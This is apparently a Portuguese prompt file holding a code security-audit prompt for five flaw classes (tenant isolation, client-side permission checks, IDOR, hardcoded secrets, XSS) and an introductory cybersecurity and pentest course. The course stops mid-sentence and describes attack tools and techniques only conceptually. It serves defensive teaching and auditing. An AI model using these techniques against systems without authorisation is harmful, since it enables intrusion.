---
title: prompt
version: 1
order: 10
purpose: 
agents: 
---
PROMPT 1 : 

Revisa este código atrás de cinco falhas de segurança. Antes de começar, detecte a stack do projeto (linguagem, framework, ORM/query builder, mecanismo de auth, frontend, arquivos de deploy como Docker/CI/Helm/Terraform) e adapte cada categoria ao equivalente dessa stack:

1. BANCO SEM TRANCA (isolamento de inquilino/dono) — em Supabase é RLS ausente; em APIs próprias são queries de listagem/busca/agregação/relatório/exportação que não filtram pelo usuário autenticado ou pela organização/workspace/tenant ao qual ele pertence. Identifique primeiro QUAL é o mecanismo de isolamento do projeto (RLS, middleware de tenant, filtro manual por user_id, etc.) e aponte onde ele está ausente ou furado.
2. PERMISSÃO DEFINIDA NO NAVEGADOR — operações privilegiadas (admin, configurações, gestão de usuários, ações de escrita) em que o frontend esconde a UI por papel (isAdmin, canEdit, role...) mas o servidor NÃO faz a verificação equivalente. Cruze cada gate de papel do frontend com o endpoint correspondente e confirme se o backend valida o privilégio em toda rota sensível.
3. IDOR — rotas que buscam, alteram ou deletam um objeto por ID (path, query ou body) sem verificar se o objeto pertence ao usuário/tenant do chamador. Percorra sistematicamente TODOS os handlers de rota do backend, não amostras.
4. CHAVES EXPOSTAS (hardcode) — API keys, tokens, senhas, segredos de assinatura (JWT, webhooks), chaves privadas e credenciais padrão embutidos no código-fonte, configs, docker-compose, charts, CI, scripts e documentação. Atenção especial a defaults públicos que viram segredo real se não forem sobrescritos (ex: ${VAR:-valor-default}) e à ausência de validação de startup que rejeite esses defaults. Verifique também o histórico git por segredos commitados e o bundle do frontend por chaves embutidas.
5. INPUTS SEM TRATAMENTO (XSS) — no frontend: innerHTML/dangerouslySetInnerHTML/equivalentes do framework (v-html, [innerHTML], dangerouslySet...), renderização de markdown/HTML sem sanitização, URLs controladas por usuário em href/src (javascript:), eval/new Function. No backend: input do usuário entrando em HTML de e-mails, templates ou respostas sem escape. Verifique se existe lib de sanitização no projeto e se ela é aplicada nos pontos encontrados.

REGRAS DA AUDITORIA:

- Reporte apenas achados verificados no código real. Nada de especulação. Para cada achado: caminho do arquivo, número(s) exato(s) da linha, trecho do código, por que é explorável e severidade (crítica/alta/média/baixa/informativa).
- Liste arquivo por arquivo, linha por linha.
- Registre também o que foi verificado e está CORRETO (ex: "router X valida posse em todos os handlers") — isso vira a seção de pontos fortes e prova a cobertura da auditoria.
- Quando a categoria não se aplicar à stack (ex: projeto sem frontend), diga isso explicitamente em vez de forçar achados.
- Note condições de explorabilidade (feature flags, config insegura necessária, etc.).

PROMPT 2 : 

Curso: Cybersecurity, Segurança da
Informação, Pentest e Ethical Hacking

Módulo 1: Fundamentos da Cibersegurança e
Segurança da Informação

Visão Geral
Este módulo serve como a pedra angular para a compreensão do vasto e dinâmico
campo da segurança digital. Nele, desvendaremos os conceitos fundamentais que
sustentam a cibersegurança e a segurança da informação, estabelecendo uma base
sólida para os tópicos mais avançados que serão abordados posteriormente. A
distinção entre cibersegurança e segurança da informação, embora sutil para alguns, é
crucial para entender as diferentes facetas da proteção de ativos digitais e
informações sensíveis. Além disso, exploraremos os pilares que sustentam a
segurança da informação, conhecidos como a Tríade CIA (Confidencialidade,
Integridade e Disponibilidade), e expandiremos para incluir a Autenticidade e o Não
Repúdio, elementos igualmente vitais na garantia de um ambiente digital seguro. Por
fim, este módulo detalhará as ameaças cibernéticas mais comuns e as
vulnerabilidades inerentes aos sistemas, fornecendo uma visão clara dos desafios que
profissionais de segurança enfrentam diariamente.
Tópicos:
Introdução à Cibersegurança
Cibersegurança é a prática de proteger sistemas, redes e programas de ataques
digitais. Esses ataques cibernéticos geralmente visam acessar, alterar ou destruir
informações confidenciais; extorquir dinheiro de usuários; ou interromper processos
de negócios normais [1]. Em um mundo cada vez mais conectado, onde a
dependência de sistemas digitais é onipresente, a cibersegurança tornou-se uma
preocupação primordial para indivíduos, empresas e governos. Ela abrange uma

ampla gama de tecnologias, processos e controles projetados para proteger redes,
computadores, programas e dados contra danos, ataques ou acesso não autorizado.
A cibersegurança pode ser dividida em várias categorias, cada uma focada em uma
área específica de proteção [2]:
Segurança de Rede: Protege a rede de computadores contra intrusos, sejam eles
invasores direcionados ou malware oportunista.
Segurança de Aplicativos: Foca em manter o software e os dispositivos livres de
ameaças. O sucesso da segurança começa na fase de projeto, bem antes de um
programa ou dispositivo ser implantado.
Segurança de Informações: Protege a integridade e a privacidade dos dados,
tanto no armazenamento quanto em trânsito.
Segurança Operacional: Inclui os processos e decisões para tratamento e
proteção dos arquivos com dados. As permissões que os usuários têm ao acessar
uma rede e os procedimentos que determinam como e onde os dados podem ser
armazenados ou compartilhados se enquadram nesta categoria.
Recuperação de Desastres e Continuidade dos Negócios: Definem como uma
organização responde a um incidente de cibersegurança ou qualquer outro
evento que cause a perda de operações ou dados.
Educação do Usuário Final: Aborda o fator de cibersegurança mais imprevisível:
as pessoas. Ensinar os usuários a identificar e evitar ameaças é vital para a
segurança de qualquer organização.
Diferença entre Cibersegurança e Segurança da Informação
Embora frequentemente usados de forma intercambiável, os termos cibersegurança e
segurança da informação (InfoSec) possuem distinções importantes. A Segurança da
Informação é um campo mais amplo que se concentra na proteção de todas as
informações de uma organização, independentemente de sua forma (digital ou física).
Seu objetivo é proteger a confidencialidade, integridade e disponibilidade dos dados
[3].
Por outro lado, a Cibersegurança é um subconjunto da segurança da informação que
se concentra especificamente na proteção de informações e sistemas digitais contra
ameaças cibernéticas. Ela lida com a proteção de dados em ambientes online, redes,

softwares e hardware conectados à internet [1]. Em essência, toda cibersegurança é
segurança da informação, mas nem toda segurança da informação é cibersegurança.
Pilares da Segurança da Informação (Tríade CIA)
A segurança da informação é tradicionalmente construída sobre três princípios
fundamentais, conhecidos como a Tríade CIA: Confidencialidade, Integridade e
Disponibilidade [3]. Esses pilares são cruciais para garantir a proteção eficaz dos
dados e sistemas.
Confidencialidade: Garante que as informações sejam acessíveis apenas por
indivíduos autorizados. Isso significa proteger os dados contra acesso não
autorizado, divulgação ou roubo. Exemplos de medidas de confidencialidade
incluem criptografia de dados, controle de acesso baseado em funções e
autenticação multifator.
Integridade: Assegura que as informações sejam precisas, completas e não
tenham sido alteradas de forma não autorizada. A integridade dos dados é vital
para a tomada de decisões e para a confiabilidade dos sistemas. Medidas para
garantir a integridade incluem hashes criptográficos, assinaturas digitais e
controles de versão.
Disponibilidade: Garante que os usuários autorizados tenham acesso às
informações e aos sistemas quando necessário. Isso envolve a proteção contra
interrupções de serviço, ataques de negação de serviço (DoS) e falhas de
hardware ou software. Estratégias para garantir a disponibilidade incluem
backups regulares, redundância de sistemas e planos de recuperação de
desastres.
Além da Tríade CIA, outros dois princípios são frequentemente adicionados para
fornecer uma visão mais completa da segurança da informação:
Autenticidade: Garante que a identidade de um usuário, sistema ou informação
seja verificada e confiável. Isso é alcançado através de mecanismos como senhas
fortes, certificados digitais e biometria.
Não Repúdio: Impede que uma parte negue ter realizado uma ação ou
transação. Isso é fundamental para a responsabilização e a auditoria, garantindo
que as ações possam ser rastreadas até sua origem. Assinaturas digitais e logs de
auditoria são exemplos de mecanismos de não repúdio.

Ameaças Cibernéticas Comuns
As ameaças cibernéticas são diversas e estão em constante evolução, tornando a
proteção um desafio contínuo. Compreender os tipos mais comuns de ataques é o
primeiro passo para desenvolver defesas eficazes. Abaixo, detalhamos algumas das
ameaças mais prevalentes [4]:
Malware: Termo genérico para software malicioso projetado para causar danos,
roubar dados ou obter acesso não autorizado a sistemas. Inclui:
Vírus: Programas que se anexam a outros programas e se replicam,
infectando outros arquivos e sistemas.
Ransomware: Malware que criptografa os arquivos da vítima e exige um
pagamento (resgate) para restaurar o acesso. Exemplos notáveis incluem
WannaCry e NotPetya [5].
Trojans (Cavalos de Troia): Programas maliciosos disfarçados de software
legítimo. Eles podem criar backdoors, roubar dados ou instalar outros
malwares.
Spyware: Software que coleta informações sobre as atividades do usuário
sem seu conhecimento, como senhas, dados bancários e histórico de
navegação.
Adware: Software que exibe anúncios indesejados, muitas vezes de forma
intrusiva, e pode conter componentes de spyware.
Botnets: Redes de computadores infectados (bots) controlados por um
atacante (botmaster) para realizar atividades maliciosas em larga escala,
como ataques DDoS ou envio de spam.
Phishing: Ataques que tentam enganar os usuários para que revelem
informações confidenciais (como nomes de usuário, senhas e detalhes de cartão
de crédito) ou instalem malware, geralmente por meio de e-mails, mensagens ou
sites falsos que se passam por entidades legítimas. O phishing é um dos métodos
mais comuns e eficazes para obter acesso inicial a sistemas [4].
Ataques Man-in-the-Middle (MitM): Ocorre quando um atacante intercepta a
comunicação entre duas partes, sem que nenhuma delas perceba. O atacante
pode então ouvir, capturar ou manipular os dados transmitidos. Isso é comum
em redes Wi-Fi não seguras [4].

Ataques de Negação de Serviço (DoS) e Negação de Serviço Distribuída
(DDoS): Têm como objetivo tornar um serviço, sistema ou rede indisponível para
seus usuários legítimos, sobrecarregando-o com um volume massivo de tráfego.
Em um ataque DDoS, múltiplos sistemas comprometidos (botnet) são usados
para inundar o alvo, tornando a mitigação mais difícil [4].
Injeção de SQL: Uma técnica de ataque que explora vulnerabilidades em
aplicações web que interagem com bancos de dados. O atacante insere código
SQL malicioso em campos de entrada, fazendo com que o banco de dados
execute comandos não intencionais, o que pode levar ao roubo, alteração ou
exclusão de dados [4].
Engenharia Social: Manipulação psicológica de pessoas para que executem
ações ou divulguem informações confidenciais. Não envolve falhas técnicas, mas
sim a exploração da natureza humana. Exemplos incluem pretexto, isca e quid
pro quo [4].
Vulnerabilidades Comuns
Vulnerabilidades são fraquezas em sistemas, softwares, hardware ou processos que
podem ser exploradas por atacantes para comprometer a segurança. A identificação e
correção de vulnerabilidades são componentes críticos da cibersegurança. Algumas
das vulnerabilidades mais comuns incluem [6]:
Sistemas Desatualizados: Softwares e sistemas operacionais que não são
atualizados regularmente podem conter falhas de segurança conhecidas que já
foram corrigidas em versões mais recentes. A não aplicação de patches e
atualizações deixa esses sistemas expostos a ataques.
Falhas de Configuração: Configurações padrão, incorretas ou inadequadas de
sistemas, redes e aplicativos podem criar brechas de segurança. Isso inclui
senhas padrão não alteradas, serviços desnecessários habilitados ou permissões
de acesso excessivas.
Vulnerabilidades em Aplicações Web (OWASP Top 10): A Open Web Application
Security Project (OWASP) publica regularmente uma lista das 10 vulnerabilidades
de segurança mais críticas em aplicações web. As mais comuns incluem:
Injeção: Como a injeção de SQL, onde dados não confiáveis são enviados a
um interpretador como parte de um comando ou consulta.

Quebra de Autenticação e Gerenciamento de Sessão: Falhas na
implementação de funções de autenticação ou gerenciamento de sessão
que permitem que atacantes comprometam senhas, chaves de sessão ou
tokens.
Cross-Site Scripting (XSS): Permite que atacantes injetem scripts
maliciosos no conteúdo de um site, que são então executados no
navegador de outros usuários.
Insecure Direct Object References (IDOR): Ocorre quando uma aplicação
expõe uma referência direta a um objeto de implementação interna, como
um arquivo, diretório ou chave de banco de dados, sem verificar a
autorização do usuário.
Configuração de Segurança Incorreta: Resulta de configurações padrão
inseguras, configurações incompletas ou ad hoc, ou armazenamento em
nuvem mal configurado.
Erros Humanos: Apesar de todas as tecnologias de segurança, o fator humano
continua sendo uma das maiores vulnerabilidades. Erros como clicar em links
maliciosos, usar senhas fracas, compartilhar informações confidenciais ou não
seguir políticas de segurança podem comprometer a segurança de uma
organização.
Credenciais Fracas ou Comprometidas: O uso de senhas fáceis de adivinhar,
senhas reutilizadas em vários serviços ou credenciais que foram vazadas em
violações de dados anteriores representam um risco significativo. A autenticação
multifator (MFA) é uma medida eficaz para mitigar essa vulnerabilidade.
Falta de Criptografia: A ausência de criptografia para dados em trânsito
(comunicações de rede) e em repouso (dados armazenados) os torna vulneráveis
a interceptação e acesso não autorizado. Isso é especialmente crítico para
informações sensíveis.

Referências
[1] Kaspersky. O que é cibersegurança? Disponível em:
https://www.kaspersky.com.br/resource-center/definitions/what-is-cyber-security

[2] IBM. O que é a cibersegurança? Disponível em: https://www.ibm.com/br-
pt/topics/cybersecurity

[3] IBM. O que é a segurança da informação? Disponível em: https://www.ibm.com/br-
pt/topics/information-security

[4] Check Point Software. Os 8 principais tipos de ciberataque. Disponível em:

https://www.checkpoint.com/pt/cyber-hub/cyber-security/what-is-cyber-
attack/types-of-cyber-attacks/

[5] AIQON Blog. Os 10 Maiores Ataques Cibernéticos da História. Disponível em:
https://aiqon.com.br/blog/maiores-ataques-ciberneticos-historia/
[6] Atlas Governance. Boas práticas de segurança da informação. Disponível em:

https://welcome.atlasgov.com/blog/ciberseguranca/boas-praticas-de-seguranca-da-
informacao/

Módulo 2: Teste de Penetração (Pentest)

Visão Geral
O Teste de Penetração, comumente conhecido como Pentest, é uma das ferramentas
mais eficazes no arsenal da cibersegurança ofensiva. Este módulo se aprofundará no
conceito de pentest, explicando sua importância estratégica para as organizações e
como ele se diferencia de outras práticas de segurança. Abordaremos as fases
metodológicas que guiam um pentest, desde o planejamento inicial até a elaboração
do relatório final, e exploraremos os diversos tipos de pentest, como caixa branca,
caixa preta e caixa cinza, além das abordagens externa e interna. O objetivo é fornecer
uma compreensão clara de como os pentests são conduzidos para identificar e mitigar
vulnerabilidades em sistemas e redes.

Tópicos:
Introdução ao Pentest
Pentest, ou teste de penetração, é um teste de segurança cibernética que utiliza um
ataque cibernético simulado para encontrar vulnerabilidades em um sistema
computacional [7]. O principal objetivo de um pentest é identificar pontos fracos nas

defesas de um sistema antes que atores maliciosos possam explorá-los. Ao simular
ataques reais, as organizações podem obter uma visão prática de suas posturas de
segurança e implementar as correções necessárias para fortalecer suas defesas.
Importância do Pentest:
Identificação Proativa de Vulnerabilidades: Ajuda a descobrir falhas e brechas
que poderiam passar despercebidas em outras avaliações de segurança.
Validação de Controles de Segurança: Verifica a eficácia dos controles de
segurança existentes e das políticas de segurança da informação.
Conformidade Regulatória: Muitos regulamentos e padrões de segurança
(como PCI DSS) exigem a realização regular de testes de penetração para garantir
a conformidade [8].
Conscientização e Treinamento: Os resultados de um pentest podem ser
usados para educar equipes de TI e usuários sobre os riscos e as melhores
práticas de segurança.
Redução de Riscos e Custos: Ao identificar e corrigir vulnerabilidades antes de
um ataque real, as organizações podem evitar perdas financeiras, danos à
reputação e interrupções operacionais.
Diferença entre Pentest e Hacking Ético
Embora os termos
“hacking ético” e “teste de penetração” sejam frequentemente usados de forma
intercambiável, há uma distinção importante a ser feita [7]:
Hacking Ético: É um campo mais amplo da cibersegurança que engloba
qualquer uso de habilidades de hacking para melhorar a segurança da rede. Um
hacker ético pode realizar diversas atividades, como análise de malware,
avaliação de vulnerabilidades, engenharia reversa e, claro, testes de penetração.
O objetivo principal é sempre o de proteger sistemas e dados.
Teste de Penetração (Pentest): É uma metodologia específica dentro do
hacking ético. É um ataque simulado e autorizado a um sistema ou rede para
identificar e explorar vulnerabilidades. Em outras palavras, todo pentest é
realizado por um hacker ético, mas nem toda atividade de um hacker ético é um
pentest.

Fases do Pentest (PTES)
O Penetration Testing Execution Standard (PTES) é uma metodologia amplamente
aceita que define sete fases para a execução de um teste de penetração [9]:

1. Interações Pré-Engajamento (Pre-engagement Interactions): Esta fase inicial
envolve a definição do escopo do pentest, os objetivos, as regras de
engajamento, os termos e condições, e a assinatura de acordos legais (como o
NDA - Non-Disclosure Agreement). É crucial para garantir que todas as partes
envolvidas tenham um entendimento claro do que será testado e como.
2. Coleta de Inteligência (Intelligence Gathering): Também conhecida como
reconhecimento ou footprinting, esta fase consiste na coleta passiva e ativa de
informações sobre o alvo. Isso pode incluir a busca por informações públicas
(OSINT - Open Source Intelligence) em sites, redes sociais, registros DNS, bem
como a varredura de portas e serviços para identificar possíveis pontos de
entrada. O objetivo é construir um perfil detalhado do ambiente do alvo.
3. Modelagem de Ameaças (Threat Modeling): Com base nas informações
coletadas, nesta fase são identificadas e priorizadas as ameaças potenciais ao
sistema. A modelagem de ameaças ajuda a entender os ativos mais críticos, os
vetores de ataque mais prováveis e as vulnerabilidades que podem ser
exploradas. Ferramentas como STRIDE (Spoofing, Tampering, Repudiation,
Information Disclosure, Denial of Service, Elevation of Privilege) podem ser
usadas para estruturar essa análise.
4. Análise de Vulnerabilidades (Vulnerability Analysis): Esta fase envolve a
identificação de vulnerabilidades específicas nos sistemas, aplicações e redes do
alvo. Isso pode ser feito através de varreduras automatizadas de
vulnerabilidades, análise manual de código, testes de configuração e outras
técnicas. O objetivo é encontrar falhas que possam ser exploradas na próxima
fase.
5. Exploração (Exploitation): Nesta fase, o testador de penetração tenta explorar
as vulnerabilidades identificadas para obter acesso ao sistema ou rede. Isso pode
envolver o uso de exploits, ataques de força bruta, injeção de SQL, XSS, ou outras
técnicas. O objetivo não é causar danos, mas sim demonstrar o impacto
potencial de uma exploração bem-sucedida.
6. Pós-Exploração (Post Exploitation): Uma vez que o acesso inicial é obtido, esta
fase se concentra em manter o acesso ao sistema, escalar privilégios, coletar
informações adicionais e identificar outros sistemas que podem ser
comprometidos (movimento lateral). O objetivo é simular o que um atacante real
faria após a invasão inicial para entender o verdadeiro impacto de uma violação.
7. Relatórios (Reporting): A fase final e uma das mais importantes. O testador de
penetração documenta todas as descobertas, incluindo as vulnerabilidades
encontradas, os métodos de exploração utilizados, o impacto potencial e as
recomendações para remediação. O relatório deve ser claro, conciso e acionável,
fornecendo informações técnicas detalhadas para as equipes de TI e um resumo
executivo para a gerência.
Tipos de Pentest
Os testes de penetração podem ser classificados de diversas maneiras, dependendo
do nível de conhecimento que o testador tem sobre o sistema alvo e do ambiente em
que o teste é realizado [8]:
Pentest de Caixa Branca (White Box Testing): Neste tipo de pentest, o testador
tem conhecimento completo da infraestrutura do alvo, incluindo diagramas de
rede, código-fonte, credenciais de acesso e outras informações internas. É como
se o testador tivesse acesso total aos “planos” do sistema. Este tipo de teste é
ideal para avaliar a segurança interna de uma aplicação ou rede, pois permite
uma análise aprofundada e a identificação de vulnerabilidades que seriam
difíceis de encontrar sem esse conhecimento.
Pentest de Caixa Preta (Black Box Testing): Ao contrário do pentest de caixa
branca, neste cenário o testador não possui conhecimento prévio sobre o
sistema alvo. Ele simula um atacante externo que não tem informações
privilegiadas. O testador precisa descobrir informações sobre o alvo por conta
própria, usando técnicas de reconhecimento e varredura. Este tipo de teste é útil
para avaliar a postura de segurança de uma organização do ponto de vista de um
atacante real e não autorizado.
Pentest de Caixa Cinza (Gray Box Testing): Este tipo de pentest é uma
combinação dos dois anteriores. O testador possui algum conhecimento
limitado sobre o sistema alvo, como credenciais de usuário padrão ou acesso a
documentação parcial. Isso simula um cenário em que um atacante interno

(como um funcionário insatisfeito) ou um atacante externo que obteve algum
nível de acesso inicial tenta explorar vulnerabilidades.
Pentest Externo: Foca em sistemas e redes acessíveis pela internet, como
servidores web, firewalls, roteadores e aplicações web. O objetivo é simular um
ataque de um invasor externo que tenta obter acesso à rede interna da
organização.
Pentest Interno: Realizado a partir da rede interna da organização, simulando
um ataque de um funcionário mal-intencionado ou de um atacante que já obteve
acesso inicial à rede. Este tipo de teste ajuda a identificar vulnerabilidades que
poderiam ser exploradas para escalar privilégios ou mover-se lateralmente
dentro da rede.
Pentest Secreto (Double-Blind Testing): Neste tipo de pentest, a equipe de
segurança da organização não é informada sobre a realização do teste. Apenas
um número muito limitado de pessoas na alta gerência tem conhecimento. O
objetivo é testar não apenas a segurança técnica, mas também a capacidade de
detecção e resposta a incidentes da equipe de segurança. É um teste mais
realista da capacidade de defesa da organização.
Metodologias de Pentest
Além do PTES, existem outras metodologias e frameworks que guiam a execução de
testes de penetração, cada uma com suas particularidades e focos [9]:
OWASP Testing Guides: A Open Web Application Security Project (OWASP)
oferece guias detalhados para testes de segurança em diversas áreas, como:
Web Security Testing Guide (WSTG): Focado em testes de segurança de
aplicações web, cobrindo uma vasta gama de vulnerabilidades e técnicas
de teste.
Mobile Security Testing Guide (MSTG): Guia para testes de segurança em
aplicações móveis (Android/iOS).
Firmware Security Testing Methodology: Metodologia para testes de
segurança em firmware.
NIST 800-115 (Technical Guide to Information Security Testing and
Assessment): Publicado pelo National Institute of Standards and Technology
(NIST), este guia fornece uma abordagem abrangente para testes e avaliações de

segurança da informação. Inclui técnicas de revisão, identificação e análise de
alvos, validação de vulnerabilidades, planejamento e execução de avaliações de
segurança, e atividades pós-teste.
OSSTMM (Open Source Security Testing Methodology Manual): Uma
metodologia abrangente para testar a segurança operacional de diversos
componentes, incluindo locais físicos, fluxo de trabalho, segurança humana,
segurança física, segurança sem fio, segurança de telecomunicações e segurança
de redes de dados. Embora não seja um guia técnico de aplicação de pentest, ele
serve como um suporte para a ISO 27001 e oferece uma visão holística da
segurança.

Referências
[7] IBM. O que é Pentest (teste de penetração)? Disponível em:
https://www.ibm.com/br-pt/topics/penetration-testing
[8] Cloudflare. O que é teste de penetração? Disponível em:

https://www.cloudflare.com/pt-br/learning/security/glossary/what-is-penetration-
testing/

[9] OWASP Foundation. Penetration Testing Methodologies. Disponível em:
https://owasp.org/www-project-web-security-testing-guide/latest/3-
The_OWASP_Testing_Framework/1-Penetration_Testing_Methodologies

Módulo 3: Ethical Hacking: Ferramentas e Técnicas

Visão Geral
Este módulo mergulha no universo do Ethical Hacking, explorando as ferramentas e
técnicas que hackers éticos utilizam para identificar e explorar vulnerabilidades de
forma controlada e legal. Compreenderemos o papel crucial do hacker ético na
proteção de sistemas e dados, aprofundando-nos nas considerações éticas e legais
que regem essa prática. Serão apresentadas as principais ferramentas de hacking
ético, com foco no Kali Linux e suas utilidades, e detalhadas as técnicas de
reconhecimento e exploração mais comuns. O objetivo é capacitar o aluno a entender

como essas ferramentas e técnicas são aplicadas em cenários reais para fortalecer a
segurança cibernética.
Tópicos:
Introdução ao Ethical Hacking
O Ethical Hacking, ou hacking ético, é a prática de usar as mesmas ferramentas e
técnicas que hackers maliciosos (também conhecidos como black hat hackers)
usariam, mas com a permissão do proprietário do sistema e com o objetivo de
identificar e corrigir vulnerabilidades de segurança [10]. O hacker ético, ou white hat
hacker, atua como um defensor, simulando ataques para fortalecer as defesas de um
sistema ou rede.
O Papel do Hacker Ético:
O hacker ético desempenha um papel vital na cibersegurança, atuando como um
testador de segurança proativo. Suas responsabilidades incluem:
Identificação de Vulnerabilidades: Encontrar falhas e pontos fracos em
sistemas, redes e aplicações antes que hackers maliciosos o façam.
Avaliação de Riscos: Analisar o impacto potencial das vulnerabilidades
descobertas e priorizar as correções.
Recomendação de Soluções: Propor e implementar medidas de segurança para
mitigar os riscos identificados.
Conformidade: Ajudar as organizações a cumprir regulamentações e padrões de
segurança.
Conscientização: Educar as equipes e a gerência sobre as ameaças cibernéticas
e as melhores práticas de segurança.
Ética e Legalidade no Hacking:
A distinção entre hacking ético e hacking malicioso reside na intenção e na legalidade.
O hacking ético é sempre realizado com permissão explícita e dentro dos limites da lei.
As principais considerações éticas e legais incluem:
Consentimento: Obter permissão formal e por escrito do proprietário do
sistema antes de iniciar qualquer atividade de hacking.

Legalidade: Operar estritamente dentro das leis e regulamentações aplicáveis,
como a Lei Geral de Proteção de Dados (LGPD) no Brasil ou o General Data
Protection Regulation (GDPR) na Europa.
Confidencialidade: Manter a confidencialidade de todas as informações
descobertas durante o processo de hacking, divulgando-as apenas ao cliente.
Não Malícia: Não causar danos aos sistemas ou dados durante o teste.
Relatórios: Fornecer relatórios completos e precisos de todas as descobertas,
incluindo vulnerabilidades e recomendações.
Ferramentas de Ethical Hacking
O arsenal de um hacker ético é vasto e inclui uma variedade de ferramentas projetadas
para diferentes fases do processo de hacking. Muitas dessas ferramentas são de
código aberto e estão disponíveis em distribuições Linux especializadas, como o Kali
Linux [11].
Kali Linux: Uma distribuição Linux baseada em Debian, amplamente utilizada
por profissionais de segurança e hackers éticos. Ele vem pré-instalado com
centenas de ferramentas para testes de penetração, forense digital, engenharia
reversa e muito mais. Algumas das ferramentas mais populares incluídas no Kali
Linux são:
Nmap (Network Mapper): Uma ferramenta de código aberto para
exploração de rede e auditoria de segurança. É usada para descobrir hosts e
serviços em uma rede de computadores, criando um “mapa” da rede. Pode
ser usado para varredura de portas, detecção de sistema operacional,
detecção de versão de serviço e muito mais.
Wireshark: Um analisador de protocolo de rede que permite capturar e
inspecionar o tráfego de rede em tempo real. É essencial para entender
como os dados fluem através de uma rede e para identificar anomalias ou
atividades maliciosas.
Metasploit Framework: Uma plataforma de código aberto para
desenvolvimento, teste e execução de exploits. Ele contém um vasto banco
de dados de exploits e payloads, tornando-o uma ferramenta poderosa
para testar a segurança de sistemas e redes.
John the Ripper: Um popular quebrador de senhas de código aberto. Ele
pode detectar senhas fracas em sistemas Unix, Windows e outros, usando

ataques de dicionário e força bruta.
Burp Suite: Uma suíte integrada de ferramentas para testes de segurança
de aplicações web. Inclui um proxy web, scanner de vulnerabilidades,
intruso, repetidor e sequenciador, permitindo que os testadores
interceptem, analisem e manipulem o tráfego HTTP/S.
sqlmap: Uma ferramenta de código aberto que automatiza o processo de
detecção e exploração de falhas de injeção de SQL e assumir o controle de
servidores de banco de dados. Suporta uma ampla gama de sistemas de
gerenciamento de banco de dados.
Aircrack-ng: Um conjunto de ferramentas para avaliar a segurança de redes
Wi-Fi. Ele pode ser usado para quebrar chaves WEP e WPA/WPA2-PSK, bem
como para capturar pacotes e realizar ataques de desautenticação.
OWASP ZAP (Zed Attack Proxy): Uma ferramenta de segurança de
aplicações web de código aberto, mantida pela OWASP. É projetada para
encontrar vulnerabilidades em aplicações web durante a fase de
desenvolvimento e teste.
Hashcat: Considerado o quebrador de senhas mais rápido do mundo, Hashcat é
uma ferramenta de recuperação de senhas de código aberto que suporta uma
variedade de algoritmos de hash, incluindo MD5, SHA1, SHA256, NTLM e muitos
outros. Ele pode usar CPUs, GPUs e outros aceleradores de hardware para
acelerar o processo de quebra de senhas.
Técnicas de Reconhecimento
O reconhecimento é a primeira fase de qualquer ataque cibernético ou teste de
penetração. O objetivo é coletar o máximo de informações possível sobre o alvo antes
de tentar qualquer exploração. As técnicas de reconhecimento podem ser passivas
(sem interação direta com o alvo) ou ativas (com interação direta).
Varredura de Portas (Port Scanning): Uma técnica ativa usada para identificar
quais portas estão abertas em um host ou rede, e quais serviços estão sendo
executados nessas portas. Ferramentas como Nmap são amplamente utilizadas
para essa finalidade. A varredura de portas pode revelar informações valiosas
sobre a arquitetura da rede e os serviços expostos.
Análise de Vulnerabilidades (Vulnerability Analysis): O processo de identificar,
quantificar e priorizar as vulnerabilidades em um sistema. Isso pode ser feito

usando scanners de vulnerabilidades automatizados (como Nessus, OpenVAS)
que comparam as configurações do sistema com um banco de dados de
vulnerabilidades conhecidas. A análise de vulnerabilidades ajuda a entender os
pontos fracos que podem ser explorados.
Farejamento de Rede (Network Sniffing): A interceptação e análise do tráfego
de rede. Ferramentas como Wireshark permitem que os hackers éticos capturem
pacotes de dados que trafegam pela rede e os inspecionem para identificar
informações sensíveis, credenciais não criptografadas ou padrões de
comunicação que possam ser explorados. Isso é particularmente eficaz em redes
Wi-Fi não seguras.
Técnicas de Exploração
Uma vez que as vulnerabilidades são identificadas, as técnicas de exploração são
usadas para obter acesso ou controle sobre o sistema alvo. A exploração é a fase onde
o hacker ético tenta provar que uma vulnerabilidade é realmente explorável.
Ataques de Força Bruta (Brute-Force Attacks): Tentativas sistemáticas de
adivinhar senhas, chaves de criptografia ou credenciais de login, testando todas
as combinações possíveis até encontrar a correta. Ferramentas como John the
Ripper e Hashcat são usadas para acelerar esses ataques, especialmente contra
hashes de senhas.
Injeção de SQL (SQL Injection): Uma técnica de ataque que explora
vulnerabilidades em aplicações web que interagem com bancos de dados. O
atacante insere código SQL malicioso em campos de entrada, fazendo com que o
banco de dados execute comandos não intencionais, o que pode levar ao roubo,
alteração ou exclusão de dados. Ferramentas como sqlmap automatizam esse
processo.
Engenharia Social (Social Engineering): Embora não seja uma técnica
puramente técnica, a engenharia social é uma das formas mais eficazes de
exploração. Ela envolve a manipulação psicológica de indivíduos para que
revelem informações confidenciais ou realizem ações que comprometam a
segurança. Exemplos incluem phishing (e-mails falsos), pretexting (criação de um
cenário falso para obter informações) e baiting (oferecer algo atraente para
induzir a uma ação maliciosa).

Referências

[10] IBM. O que é o Hacking ético? Disponível em: https://www.ibm.com/br-
pt/topics/ethical-hacking

[11] HackerOne. 7 Pentesting Tools You Must Know About. Disponível em:

https://www.hackerone.com/knowledge-center/7-pentesting-tools-you-must-know-
about

Módulo 4: Melhores Práticas e Estudos de Caso

Visão Geral
Este módulo final tem como objetivo consolidar o conhecimento adquirido nos
módulos anteriores, apresentando as melhores práticas de segurança da informação e
cibersegurança que são essenciais para proteger indivíduos e organizações no cenário
digital atual. Além disso, analisaremos estudos de caso reais de ataques cibernéticos e
violações de dados, bem como exemplos de sucesso em pentests e hacking ético. A
análise desses casos práticos permitirá aos alunos compreender o impacto das
ameaças cibernéticas e a importância da implementação de medidas de segurança
eficazes. Por fim, abordaremos as tendências futuras em cibersegurança, preparando
os alunos para os desafios e inovações que estão por vir.
Tópicos:
Melhores Práticas de Segurança da Informação
A implementação de um conjunto robusto de melhores práticas é fundamental para
estabelecer uma postura de segurança sólida. Essas práticas abrangem desde a gestão
técnica de sistemas até a conscientização e o comportamento humano. As principais
melhores práticas incluem [6]:
Detecção de Vulnerabilidades: Realizar varreduras e testes de vulnerabilidade
regularmente para identificar e corrigir falhas em hardware, software e
configurações. Isso inclui a utilização de ferramentas automatizadas e a
realização de pentests periódicos.

Backup: Implementar uma estratégia de backup robusta, garantindo que cópias
de segurança dos dados críticos sejam feitas regularmente e armazenadas em
locais seguros, preferencialmente fora do local e em nuvem. A capacidade de
restaurar dados rapidamente após um incidente é crucial para a continuidade
dos negócios.
Redundância de Sistemas: Projetar sistemas com redundância para garantir a
disponibilidade. Isso envolve ter componentes de hardware e software
duplicados que podem assumir o controle em caso de falha do componente
principal, minimizando o tempo de inatividade.
Controle de Acesso Eficaz: Implementar políticas de controle de acesso
